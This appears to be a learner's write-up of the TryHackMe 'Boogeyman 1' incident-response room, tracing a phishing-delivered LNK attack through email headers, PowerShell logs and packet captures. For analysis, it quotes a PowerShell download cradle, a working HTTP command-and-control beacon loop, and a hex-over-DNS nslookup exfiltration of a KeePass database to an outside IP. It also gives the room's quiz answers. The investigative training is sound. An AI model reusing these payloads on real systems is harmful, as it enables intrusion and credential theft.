# Boogeyman 1 — Writeup

## Overview
### Boogeyman 1 — Writeup
### Boogeyman 1 — Writeup
----
A new threat actor emerges from the wild using the name Boogeyman. Are you afraid of the Boogeyman?
----
### [Introduction] New threat in town.
Start Machine
﻿_Uncover the secrets of the new emerging threat, the Boogeyman._
In this room, you will be tasked to analyse the Tactics, Techniques, and Procedures (TTPs) executed by a threat group, from obtaining initial access until achieving its objective.
Prerequisites
This room may require the combined knowledge gained from the SOC L1 Pathway. We recommend going through the following rooms before attempting this challenge.
-   [Phishing Analysis Fundamentals](https://tryhackme.com/room/phishingemails1tryoe)
-   [Phishing Analysis Tools](https://tryhackme.com/room/phishingemails3tryoe)
-   [Windows Event Logs](https://tryhackme.com/room/windowseventlogs)
-   [Wireshark: Traffic Analysis](https://tryhackme.com/room/wiresharktrafficanalysis)
-   Tshark (coming soon!)
Investigation Platform
Before we proceed, deploy the attached machine by clicking the **Start Machine button** in the upper-right-hand corner of the task. It may take up to 3-5 minutes to initialise the services.
The machine will start in a split-screen view. In case the VM is not visible, use the blue Show Split View button at the top-right of the page.
Artefacts
For the investigation proper, you will be provided with the following artefacts:
-   Copy of the phishing email (dump.eml)
-   Powershell Logs from Julianne's workstation (powershell.json)
-   Packet capture from the same workstation (capture.pcapng)
Note: The powershell.json file contains JSON-formatted PowerShell logs extracted from its original evtx file via the [evtx2json](https://github.com/Silv3rHorn/evtx2json) tool.
You may find these files in the /home/ubuntu/Desktop/artefacts directory.
Tools
﻿The provided VM contains the following tools at your disposal:
-   Thunderbird - a free and open-source cross-platform email client.
-   [LNKParse3](https://github.com/Matmaus/LnkParse3) - a python package for forensics of a binary file with LNK extension.
-   Wireshark - GUI-based packet analyser.
-   Tshark - CLI-based Wireshark.
-   jq - a lightweight and flexible command-line JSON processor.
To effectively parse and analyse the provided artefacts, you may also utilise built-in command-line tools such as:
-   grep
-   sed
-   awk
-   base64
Now, let's start hunting the Boogeyman!
Answer the questions below
Let's hunt that boogeyman!
Completed
### [Email Analysis] Look at that headers!
The Boogeyman is here!
Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.
The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector.
You are tasked to analyse and assess the impact of the compromise.
Investigation Guide
Given the initial information, we know that the compromise started with a phishing email. Let's start with analysing the **dump.eml** file located in the artefacts directory. There are two ways to analyse the headers and rebuild the attachment:
-   The manual way uses command-line tools such as **cat**, **grep**, **base64**, and **sed.** Analyse the contents manually and build the attachment by decoding the string located at the bottom of the file.
ubuntu@tryhackme:~
```shell-session
ubuntu@tryhackme$ echo # sample command to rebuild the payload, presuming the encoded payload is written in another file, without all line terminators
ubuntu@tryhackme$ cat *PAYLOAD FILE* | base64 -d > Invoice.zip
```
-   An alternative and easier way to do this is to double-click the EML file to open it via Thunderbird. The attachment can be saved and extracted accordingly.
Once the payload from the encrypted archive is extracted, use **lnkparse** to extract the information inside the payload.
ubuntu@tryhackme:~
```shell-session
ubuntu@tryhackme$ lnkparse *LNK FILE*
```
Answer the questions below
```text
doing in 2 ways
ubuntu@tryhackme:~/Desktop/artefacts$ echo "UEsDBBQAAQAIAGiGLVZRFQDJ3gIAACgJAAAUAAAASW52b2ljZV8yMDIzMDEwMy5sbmvuhS6/jU+4
> ClhWAZwY+LBcOUvw6oMIq5WNiZwjlKXvAj+pMMBFROiABqlJBxngGOoWUKX0yBXsXOhYPq3Z+Zls
> vZX0xZqtZ/KWnX/QpZXzW44KZz1eqH+hnLgKXPTBsyTSqpqK9QUvYEsltPMSYnL0IqSNwX2TuL9l
> oB0QB3owNKK2cltANxR5Nt3pdYwKJ4BqqI4x7D/ze4bWBT1jlR4HW8VEByEyLoc2fw3I0r0bc/8J
> v9g1SZPBvshBg0pxI0/89GR2agMP+Lv6smkO/huUEOSRpidp/ft+prkt5v9sHFyS/Q0CTb9njCi2
> terQ9NTeFAOkNAhGxWUPqPwPzB0cS+GBC2JY3LMqlA0K5aTejRodyVPcLlq2KVbyF7XljH2NZA4T
> bFsDNJMFk2fQB1hfvmseP9FA20VAfwYvYW8GnBDdqhJtAwJ5xNvJgFFK/MTY2fChwTNN2zszqhzn
> v1Sx+71+duA41HGR9K/jh4nEeRgPslOVlGtLwKBikbIpx/5ZaLpiZYwKS177jDoh3Qx+FRxsM6Ue
> hjPSNgKmWHFZjReDWx8KD7qGLL9acO0hvZUuH83b70sAREDJbw+4sC2jcYO+hrHys6E4Dml030WQ
> WhkKpvYv4DUw9nDmkGg4YgnyAv/iMbtImSUZQ/Wc6dEJM213hYefp8DTQZ321fZU5iCk86bAdxX2
> 3Ov40S9eX78X7CSp9b0QKNeC+N3JgMJ/gQrCWC73UfmHjT4mkBoP8A4YktR2LFNeistVP/zeMQPS
> qUs8KaI7q+VTu/9buNeWkEW2maDm+bC0Q4AnJL+AocgZDPJ0RzfLWEpff3nbaYb6aPqhLTBfFURi
> dszLIMEKmDLmiVqkWZJly9qV26NFttz5y4Q+fAATd6tMYRDlu/BFCo4+rdxjiKl0Gnn7UBHCq0gy
> eEv/L8bppKI09XqNV3MJxMLBE3RN7E080hVp07qDpNpQTYEFa08gGy6yYFBLAQI/ABQAAQAIAGiG
> LVZRFQDJ3gIAACgJAAAUACQAAAAAAAAAIAAAAAAAAABJbnZvaWNlXzIwMjMwMTAzLmxuawoAIAAA
> AAAAAQAYAGiPRUBvJ9kBAAAAAAAAAAAAAAAAAAAAAFBLBQYAAAAAAQABAGYAAAAQAwAAAAA=" | base64 -d > Invoice2.zip
ubuntu@tryhackme:~/Desktop/artefacts$ ls
Invoice.zip   capture.pcapng  evtx2json        powershell.json
Invoice2.zip  dump.eml        powershell.evtx
ubuntu@tryhackme:~/Desktop/artefacts$ file Invoice2.zip 
Invoice2.zip: Zip archive data, at least v2.0 to extract
ubuntu@tryhackme:~/Desktop/artefacts$ file Invoice.zip 
Invoice.zip: Zip archive data, at least v2.0 to extract

source email

From: Arthur Griffin <agriffin@bpakcaging.xyz>
Date: Fri, 13 Jan 2023 09:25:26 +0000
Subject: Collection for Quick Logistics LLC - Jan 2023
Message-Id: <4uiwqc5wd1qx.HPk2p-JE_jYbkWIRB-SmuA2@tracking.bpakcaging.xyz>
Reply-To: Arthur Griffin <agriffin@bpakcaging.xyz>
Sender: agriffin@bpakcaging.xyz
To: Julianne Westcott <julianne.westcott@hotmail.com>

DKIM-Signature: v=1; a=rsa-sha256; d=elasticemail.com; s=api;
	c=relaxed/simple; t=1673601926;
	h=from:date:subject:reply-to:to:list-unsubscribe;
	bh=DORzQK4K9VXO5g47mYpyX7cPagIyvAX1RLfbY0szvCc=;
	b=jcC3z+U5lVQUJEYRyQ76Z+xaJMrXN2YdjyM8pUl7hgXesQaY7rqSORNRWynpDQ3/CBSllw31eDq
	WmoqpFqj2uVy5RXK73lkBEHs5ju1eH/4svHpZLS9+wU/tO5dfZVUImvY32iinpJCtoiMLjdpKYMA/
	d5BBGqluALtqy9fZQzM=
List-Unsubscribe:
 =?us-ascii?q?=3Cmailto=3Aunsubscribe+HPk2p-JE=5FjYbkWIRB-SmuA2=40bounces=2Eelasticem?=
 =?us-ascii?q?ail=2Enet=3Fsubject=3Dunsubscribe=3E=2C?=
 =?us-ascii?q?_=3Chttp=3A=2F=2Ftracking=2Ebpakcaging=2Exyz=2Ftracking=2Funsubscribe=3Fmsgid=3DHP?=
 =?us-ascii?q?k2p-JE=5FjYbkWIRB-SmuA2&c=3D0=3E?=

Hi Julianne,

I hope you are well.

I just wanted to drop you a quick note to remind you in respect of doc=
ument #39586972 is due for payment on January 20, 2023.

I would be grateful if you could confirm everything is on track for pa=
yment.

For additional information, kindly see the attached document.

You may use this code to view the encrypted file: Invoice2023!

Best regards,
Arthur Griffin
Collections Officer
B Packaging Inc.

ubuntu@tryhackme:~/Desktop/artefacts$ unzip Invoice.zip 
Archive:  Invoice.zip
[Invoice.zip] Invoice_20230103.lnk password: 
  inflating: Invoice_20230103.lnk 

ubuntu@tryhackme:~/Desktop/artefacts$ lnkparse Invoice_20230103.lnk 
Windows Shortcut Information:
   Link CLSID: 00021401-0000-0000-C000-000000000046
   Link Flags: HasTargetIDList | HasName | HasRelativePath | HasWorkingDir | HasArguments | HasIconLocation | IsUnicode | HasExpIcon - (16637)
   File Flags:  - (0)

   Creation Timestamp: None
   Modified Timestamp: None
   Accessed Timestamp: None

   Icon Index: 0 
   Window Style: SW_SHOWMINNOACTIVE 
   HotKey: CONTROL - C {0x4302} 

   TARGETS:
      Index: 78
      ITEMS:
         Root Folder
            Sort index: My Computer
            Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D
         Volume Item
            Flags: 0xf
            Data: None
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: Windows
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: System32
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: WindowsPowerShell
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: v1.0
         File entry
            Flags: Is file
            Modification time: None
            File attribute flags: 0
            Primary name: powershell.exe

   DATA
      Description: Invoice Jan 2023
      Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      Working directory: C:
      Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
      Icon location: C:\Users\Administrator\Desktop\excel.ico

   EXTRA BLOCKS:
      ICON_LOCATION_BLOCK
         Target ansi: %USERPROFILE%\Desktop\excel.ico
         Target unicode: %USERPROFILE%\Desktop\excel.ico
      SPECIAL_FOLDER_LOCATION_BLOCK
         Special folder id: 37
      KNOWN_FOLDER_LOCATION_BLOCK
         Known folder id: 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7
      METADATA_PROPERTIES_BLOCK
         Version: 0x53505331
         Format id: 46588AE2-4CBC-4338-BBFC-139326986DCE

iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```
![[Pasted image 20230415090125.png]]
![[Pasted image 20230415090305.png]]
![[Pasted image 20230415090406.png]]
What is the email address used to send the phishing email?
*agriffin@bpakcaging.xyz*
What is the email address of the victim?
*julianne.westcott@hotmail.com*
What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?
*elasticemail*
What is the name of the file inside the encrypted attachment?
*Invoice_20230103.lnk*
What is the password of the encrypted attachment?
*Invoice2023!*
Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?
*aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==*
### [Endpoint Security] Are you sure that’s an invoice?
Based on the initial findings, we discovered how the malicious attachment compromised Julianne's workstation:
-   A PowerShell command was executed.
-   Decoding the payload reveals the starting point of endpoint activities.
Investigation Guide
With the following discoveries, we should now proceed with analysing the PowerShell logs to uncover the potential impact of the attack:
-   Using the previous findings, we can start our analysis by searching the execution of the initial payload in the PowerShell logs.
-   Since the given data is JSON, we can parse it in CLI using the `jq` command.
-   Note that some logs are redundant and do not contain any critical information; hence can be ignored.
JQ Cheatsheet
﻿**jq** is a lightweight and flexible command-line JSON processor**.** This tool can be used in conjunction with other text-processing commands.
You may use the following table as a guide in parsing the logs in this task.
Note: You must be familiar with the existing fields in a single log.
Parse all JSON into beautified output
`cat powershell.json | jq`
Print all values from a specific field without printing the field
`cat powershell.json | jq '.Field1'`
Print all values from a specific field
`cat powershell.json | jq '{Field1}'`
Print values from multiple fields
`cat powershell.json | jq '{Field1, Field2}'`
Sort logs based on their Timestamp
`cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'`
Sort logs based on their Timestamp and print multiple field values
`cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {Field}'`
You may continue learning this tool via its [documentation](https://stedolan.github.io/jq/manual/).
Answer the questions below
```text
ubuntu@tryhackme:~/Desktop/artefacts$ file powershell.json 
powershell.json: JSON data

ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {"ScriptBlockText"}'

{"ScriptBlockText":"iex (new-object net.webclient).downloadstring('

')"}
{"ScriptBlockText":"$s='cdn.bpakcaging.xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\"X-38d2-8f49\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\"X-38d2-8f49\"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\"X-38d2-8f49\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}\n"}
{"ScriptBlockText":"echo `r;pwd"}
{"ScriptBlockText":"whoami;pwd"}
{"ScriptBlockText":"cd C:\\;pwd"}
{"ScriptBlockText":"ls;pwd"}
{"ScriptBlockText":"cd Users;pwd"}
{"ScriptBlockText":"cd j.westcott;pwd"}
{"ScriptBlockText":"ps;pwd"}
{"ScriptBlockText":"iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd"}
{"ScriptBlockText":"cd Public;pwd"}
{"ScriptBlockText":"cd Music;pwd"}
{"ScriptBlockText":"iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe;pwd"}
{"ScriptBlockText":".\\sb.exe all;pwd"}
{"ScriptBlockText":".\\sb.exe system;pwd"}
{"ScriptBlockText":".\\sb.exe;pwd"}
{"ScriptBlockText":".\\sb.exe -group=all;pwd"}
{"ScriptBlockText":"Seatbelt.exe -group=user;pwd"}
{"ScriptBlockText":".\\sb.exe -group=user;pwd"}
{"ScriptBlockText":"ls C:\\Users\\j.westcott\\Documents\\protected_data.kdbx;pwd"}
{"ScriptBlockText":"cd ..\\AppData;pwd"}
{"ScriptBlockText":"ls Local;pwd"}
{"ScriptBlockText":"ls Local\\Packages;pwd"}
{"ScriptBlockText":"cd ..;pwd"}
{"ScriptBlockText":"ls AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe;pwd"}
{"ScriptBlockText":"ls AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState;pwd"}
{"ScriptBlockText":"iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd"}
{"ScriptBlockText":".\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\;pwd"}
{"ScriptBlockText":".\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite \"SELECT * from NOTE limit 100\";pwd"}
{"ScriptBlockText":"cd Documents;pwd"}
{"ScriptBlockText":"$file='protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd"}
{"ScriptBlockText":"split-path $pwd'\\0x00';pwd"}
{"ScriptBlockText":"$file='C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd"}
{"ScriptBlockText":"$hex = ($bytes|ForEach-Object ToString X2) -join '';;pwd"}
{"ScriptBlockText":"$split = $hex -split '(\\S{50})'; ForEach ($line in $split) { nslookup -q=A \"$line.bpakcaging.xyz\" $destination;} echo \"Done\";;pwd"}

Estos son comandos en lenguaje PowerShell que se utilizan para descargar un archivo de un servidor remoto, ejecutarlo en una ubicación específica, acceder a una base de datos protegida y realizar una búsqueda de direcciones IP en un dominio específico.

En resumen, el script descarga un archivo llamado "sq3.exe" desde un servidor remoto, lo guarda en una carpeta local, y lo utiliza para acceder a una base de datos "plum.sqlite" ubicada en "AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState". También busca la dirección IP de varios dominios en "bpakcaging.xyz" y envía los resultados a una dirección IP de destino "167.71.211.113". El comando "pwd" se utiliza para mostrar el directorio actual en el que se encuentra el usuario.

El comando que se utiliza para enviar los resultados de la búsqueda de direcciones IP a la dirección IP de destino "167.71.211.113" es el comando "nslookup" seguido de la opción "-q=A" y la dirección URL del dominio que se está buscando. El resultado de la búsqueda se envía a través del protocolo DNS a la dirección IP de destino especificada.
```
What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)
*cdn.bpakcaging.xyz,files.bpakcaging.xyz*
What is the name of the enumeration tool downloaded by the attacker?
The attacker mistakenly executed the exact tool name.
*Seatbelt*
What is the file accessed by the attacker using the downloaded **sq3.exe** binary? Provide the full file path with escaped backslashes.
Trace back the executed cd commands.
*C:\\Users\\j.westcott\\Music\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite*
What is the software that uses the file in Q3?
*Microsoft Sticky Notes*
What is the name of the exfiltrated file?
*protected_data.kdbx*
What type of file uses the .kdbx file extension?
*KeePass*
What is the encoding used during the exfiltration attempt of the sensitive file?
*hex*
What is the tool used for exfiltration?
*nslookup*
### [Network Traffic Analysis] They got us. Call the bank immediately!
Based on the PowerShell logs investigation, we have seen the full impact of the attack:
-   The threat actor was able to read and exfiltrate two potentially sensitive files.
-   The domains and ports used for the network activity were discovered, including the tool used by the threat actor for exfiltration.
Investigation Guide
Finally, we can complete the investigation by understanding the network traffic caused by the attack:
-   Utilise the domains and ports discovered from the previous task.
-   All commands executed by the attacker and all command outputs were logged and stored in the packet capture.
-   Follow the streams of the notable commands discovered from PowerShell logs.
-   Based on the PowerShell logs, we can retrieve the contents of the exfiltrated data by understanding how it was encoded and extracted.
Answer the questions below
```text
using wirehark

filter http.request.method == "POST"

POST /27fe2489 HTTP/1.1
X-38d2-8f49: 8cce49b0-b86459bb-27fe2489
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.18362.145
Content-Type: application/x-www-form-urlencoded
Host: cdn.bpakcaging.xyz:8080
Content-Length: 229
Connection: Keep-Alive

13 13 10 13 10 80 97 116 104 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 45 45 45 45 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 67 58 92 87 105 110 100 111 119 115 92 115 121 115 116 101 109 51 50 13 10 13 10 13 10HTTP/1.0 200 OK
Server: Apache/2.4.1 
Date: Fri, 13 Jan 2023 17:10:11 GMT
Access-Control-Allow-Origin: *
Content-Type: text/plain

OK

Host: cdn.bpakcaging.xyz:8080 using python default port :)

or stream 327

GET /sb.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.18362.145
Host: files.bpakcaging.xyz
Connection: Keep-Alive

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.10.7
Date: Fri, 13 Jan 2023 17:14:33 GMT
Content-type: application/x-msdos-program
Content-Length: 596992
Last-Modified: Fri, 13 Jan 2023 17:13:29 GMT

stream 750

POST /27fe2489 HTTP/1.1
X-38d2-8f49: 8cce49b0-b86459bb-27fe2489
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.18362.145
Content-Type: application/x-www-form-urlencoded
Host: cdn.bpakcaging.xyz:8080
Content-Length: 1522
Connection: Keep-Alive

92 105 100 61 56 54 56 49 53 48 98 100 45 97 53 54 52 45 52 50 51 98 45 57 50 53 54 45 55 48 100 51 55 56 49 55 57 52 98 49 32 77 97 115 116 101 114 32 80 97 115 115 119 111 114 100 13 10 92 105 100 61 97 100 56 98 53 50 102 48 45 101 49 98 98 45 52 48 102 54 45 98 98 102 57 45 52 55 97 53 51 102 57 49 56 48 97 98 32 37 112 57 94 51 33 108 76 94 77 122 52 55 69 50 71 97 84 94 121 124 77 97 110 97 103 101 100 80 111 115 105 116 105 111 110 61 68 101 118 105 99 101 73 100 58 92 92 63 92 68 73 83 80 76 65 89 35 68 101 102 97 117 108 116 95 77 111 110 105 116 111 114 35 49 38 51 49 99 53 101 99 100 52 38 48 38 85 73 68 50 53 54 35 123 101 54 102 48 55 98 53 102 45 101 101 57 55 45 52 97 57 48 45 98 48 55 54 45 51 51 102 53 55 98 102 52 101 97 97 55 125 59 80 111 115 105 116 105 111 110 61 49 49 48 54 44 52 51 59 83 105 122 101 61 51 50 48 44 51 50 48 124 49 124 48 124 124 89 101 108 108 111 119 124 48 124 124 124 124 124 124 48 124 124 56 99 97 50 50 99 48 101 45 98 97 53 101 45 52 57 57 97 45 97 56 54 99 45 55 52 55 51 97 53 51 100 99 54 100 101 124 55 52 102 48 56 55 50 52 45 99 99 99 57 45 52 99 101 54 45 57 52 101 55 45 56 99 57 57 101 54 99 100 52 50 99 54 124 54 51 56 48 57 50 50 52 55 51 57 55 49 57 57 53 56 57 124 124 54 51 56 48 57 50 50 52 55 53 49 54 49 48 55 48 55 57 13 10 13 10 80 97 116 104 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 45 45 45 45 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 67 58 92 85 115 101 114 115 92 106 46 119 101 115 116 99 111 116 116 13 10 13 10 13 10HTTP/1.0 200 OK
Server: Apache/2.4.1 
Date: Fri, 13 Jan 2023 17:25:38 GMT
Access-Control-Allow-Origin: *
